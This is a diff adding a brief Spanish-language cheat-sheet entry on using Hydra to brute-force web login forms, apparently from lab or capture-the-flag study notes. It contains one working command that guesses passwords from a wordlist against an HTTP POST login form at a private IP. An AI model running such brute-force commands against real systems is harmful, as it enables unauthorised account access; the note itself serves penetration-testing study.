@@ -1,0 +1,9 @@
+------
+Hydra
+
+# Crackear logins web
+http-post-form: indica el tipo de formulario, este puede cambiar
+hydra -l <username> -P <wordlist> 10.10.94.115 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+
+
+------
